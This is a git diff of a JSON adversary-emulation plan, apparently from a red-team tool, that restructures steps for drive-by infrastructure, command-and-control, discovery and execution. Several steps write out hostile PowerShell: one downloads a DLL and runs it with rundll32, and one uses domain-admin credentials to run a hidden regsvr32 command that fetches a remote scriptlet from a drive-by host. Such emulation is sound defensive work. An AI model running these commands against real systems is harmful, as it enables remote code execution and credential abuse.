@@ -14,7 +14,8 @@
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -24,7 +25,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -34,7 +36,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -46,7 +49,8 @@
                 "exfiltration": "self.exfil",
                 "driveby": "self.driveby",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -54,7 +58,8 @@
             "label": "Interfaces2",
             "preconditions": {
                 "driveby": "self.driveby2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -62,7 +67,8 @@
             "label": "DNS2",
             "preconditions": {
                 "driveby": "self.driveby2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -72,7 +78,8 @@
                 "payload": "MessageBoxPopup_DllPopUp_PopUp_Main.dll",
                 "driveby": "self.driveby2",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -80,7 +87,8 @@
             "label": "Interfaces3",
             "preconditions": {
                 "driveby": "self.driveby3"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -88,7 +96,8 @@
             "label": "DNS3",
             "preconditions": {
                 "driveby": "self.driveby3"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -98,7 +107,8 @@
                 "payload": "regsvr32_popup_execution.sct",
                 "driveby": "self.driveby3",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -106,7 +116,8 @@
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "InitialAccess",
@@ -118,7 +129,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Execution",
@@ -130,7 +142,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -142,7 +155,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Discovery",
@@ -151,10 +165,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "ipconfig /all"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "ipconfig /all"
             }
         },
         {
@@ -164,10 +178,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "hostname"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "hostname"
             }
         },
         {
@@ -177,10 +191,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "whoami"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "whoami"
             }
         },
         {
@@ -190,10 +204,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "systeminfo"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "systeminfo"
             }
         },
         {
@@ -203,10 +217,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell Get-CimInstance -ComputerName localhost -Class CIM_Processor -ErrorAction Stop | Select-Object *"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell Get-CimInstance -ComputerName localhost -Class CIM_Processor -ErrorAction Stop | Select-Object *"
             }
         },
         {
@@ -216,13 +230,13 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "file_store_server": "self.driveby_domain2",
-                    "file_name": "self.tool_name2",
-                    "output_directory": "C:\\Users\\Public",
-                    "output_file_name": "popup.dll"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "file_store_server": "self.driveby_domain2",
+                "file_name": "self.tool_name2",
+                "output_directory": "C:\\Users\\Public",
+                "output_file_name": "popup.dll"
             }
         },
         {
@@ -232,10 +246,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "powershell &{start-process powershell -argumentlist '-noprofile -command &{Start-Process rundll32.exe -arg C:\\Users\\Public\\popup.dll,PopUp }';echo ' '}"
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "powershell &{start-process powershell -argumentlist '-noprofile -command &{Start-Process rundll32.exe -arg C:\\Users\\Public\\popup.dll,PopUp }';echo ' '}"
             }
         },
         {
@@ -246,10 +260,10 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target_1": "self.target_1",
-                "target_2": "self.target_1_elevated",
-                "tune": {
-                    "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{powershell -c regsvr32.exe /s /n /i:http://${self.driveby_domain3}/${self.tool_name3}scrobj.dll}'};echo 'Done'"
-                }
+                "target_2": "self.target_1_elevated"
+            },
+            "tune": {
+                "command": "powershell &{$password = ConvertTo-SecureString '${self.domain_admin_password}' -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ('site.lan\\${self.domain_admin_username}', $password);start-process powershell -credential $credential -argumentlist '-noprofile -w hidden -command &{powershell -c regsvr32.exe /s /n /i:http://${self.driveby_domain3}/${self.tool_name3}scrobj.dll}'};echo 'Done'"
             }
         },
         {
@@ -260,7 +274,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         }
     ],
     "iocs": {
